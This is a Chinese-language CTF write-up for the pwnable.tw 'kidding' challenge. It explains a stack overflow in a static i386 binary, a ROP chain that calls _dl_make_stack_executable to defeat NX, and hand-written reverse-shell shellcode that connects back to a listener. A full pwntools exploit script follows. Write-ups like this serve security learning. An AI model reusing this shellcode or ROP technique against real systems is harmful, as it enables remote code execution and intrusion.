# pwnable.tw-kidding

### 0x1 分析

安全选项：

```shell
[*] './kidding'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

除了NX都没开，猜测是栈溢出。

而且是个静态链接程序。

```shell
➜  Kidding ldd kidding
	not a dynamic executable
```

看一下程序逻辑：

```c
/*main()*/
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-Ch] [ebp-Ch]

  read(0, &v4, 100);
  close(0);
  close(1);
  close(2);
  return 0;
}
```

可以栈溢出`100`个字节，但是关掉了`stdin`、`stdout`、`stderr`。

这种题目第一次做，但是学到了反弹shell的思路。

由于是静态链接，所以直接使用libc中的gadget不可能了，就得自己写shellcode。

但是开了NX保护，所以看到[网上博客](https://radareorg.github.io/blog/posts/defeating-baby_rop-with-radare2/)的思路是先关闭NX保护。

这里需要`_dl_make_stack_executable`函数，看名字就能知道这是一个让`stack`上的代码可以执行的函数，里面调用了`mprotect`函数，而作用的内存页就是`__libc_stack_end`，就是栈。

所以我们需要做些准备工作，保证可以让栈的代码可执行：

1. `ds:__stack_prot`设置为`7`，另外两个参数不用动。
2. 要在`eax`里放入`__libc_stack_end`的地址，因为下面有个代码`cmp     ecx, ds:__libc_stack_end`。

```assembly
.text:0809A080 _dl_make_stack_executable proc near     ; CODE XREF: _dl_map_object_from_fd_constprop_7+D0A↑p
.text:0809A080                                         ; DATA XREF: .data:_dl_make_stack_executable_hook↓o
.text:0809A080 ; __unwind {
.text:0809A080                 push    esi
.text:0809A081                 push    ebx
.text:0809A082                 sub     esp, 4
.text:0809A085                 mov     esi, _dl_pagesize
.text:0809A08B                 mov     ecx, [eax]
.text:0809A08D                 mov     edx, esi
.text:0809A08F                 neg     edx
.text:0809A091                 and     edx, ecx
.text:0809A093                 cmp     ecx, ds:__libc_stack_end
.text:0809A099                 jnz     short loc_809A0D0
.text:0809A09B                 sub     esp, 4
.text:0809A09E                 push    ds:__stack_prot
.text:0809A0A4                 mov     ebx, eax
.text:0809A0A6                 push    esi
.text:0809A0A7                 push    edx
.text:0809A0A8                 call    mprotect
[···]
```

然后就是反弹shell了。

1. 由于`fd`中`0、1、2`皆已被`close`，拿到的`socket` `fd`即已经是`0`，因此只需要进行一次`dup2`。
2. 由于`ebp`可控（`ebp`的值会等于`input`中的第`8~11 byte`），由此可以`push ebp`取代一次`push IP`，省下`4 bytes`。
3. `push` `port`時使用`ax`中已有的数值（`0x66`），`port`（big endian）将被固定为`0x6600`。

```assembly
   0:   6a 01                   push   0x1
   2:   5b                      pop    ebx
   3:   99                      cdq
   4:   b0 66                   mov    al,0x66
   6:   52                      push   edx		# 0
   7:   53                      push   ebx 		# 1
   8:   6a 02                   push   0x2
   a:   89 e1                   mov    ecx,esp	
   c:   cd 80                   int    0x80
   
   e:   5e                      pop    esi		# 2	
   f:   59                      pop    ecx		# 1
  10:   93                      xchg   ebx,eax# ebx 0
  11:   b0 3f                   mov    al,0x3f
  13:   cd 80                   int    0x80
  
  15:   b0 66                   mov    al,0x66
  17:   55                      push   ebp
  18:   66 50                   push   ax
  1a:   66 56                   push   si
  1c:   89 e1                   mov    ecx,esp
  1e:   0e                      push   cs
  1f:   51                      push   ecx
  20:   53                      push   ebx
  21:   89 e1                   mov    ecx,esp
  23:   b3 03                   mov    bl,0x3
  25:   cd 80                   int    0x80
  
  27:   b0 0b                   mov    al,0xb
  29:   59                      pop    ecx
  2a:   68 2f 73 68 00          push   0x68732f
  2f:   68 2f 62 69 6e          push   0x6e69622f
  34:   89 e3                   mov    ebx,esp
  36:   cd 80                   int    0x80
```

学到了。

### 0x12 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'i386' , os = 'linux', log_level='debug')

p = process('./kidding')
elf = ELF('./kidding')

# payload
reverse_shellcode = (
    "\x6a\x01\x5b\x99\xb0\x66\x52\x53\x6a"
    "\x02\x89\xe1\xcd\x80\x5e\x59\x93\xb0\x3f"
    "\xcd\x80\xb0\x66\x55\x66\x50\x66\x56"
    "\x89\xe1\x0e\x51\x53"
    "\x89\xe1\xb3\x03\xcd\x80\xb0\x0b\x59\x68\x2f\x73\x68"
    "\x00\x68\x2f\x62\x69\x6e\x89\xe3"
    "\xcd\x80"
)
rop = ROP('./kidding')
# __stack_prot = 7
rop.raw(rop.find_gadget(['pop ecx', 'ret']).address)
rop.raw(rop.resolve('__stack_prot'))
rop.raw(rop.find_gadget(['pop dword ptr [ecx]', 'ret']).address)
rop.raw(7)

# call _dl_make_stack_executable
rop.raw(rop.find_gadget(['pop eax', 'ret']).address)
rop.raw(rop.resolve('__libc_stack_end'))
rop.raw(rop.resolve('_dl_make_stack_executable'))

# Run our shellcode
rop.raw(0x080c99b0) # call esp

# listen_ip        = '47.93.233.109'
listen_ip        = '0.0.0.0'
listen_port      = 0x6600
payload = 'A' * 8 + binary_ip(listen_ip) + str(rop) + reverse_shellcode


# p = remote('chall.pwnable.tw', 10303)
listener = listen(listen_port)
p.send(payload)
# success(disasm(reverse_shellcode))
listener.interactive()
```

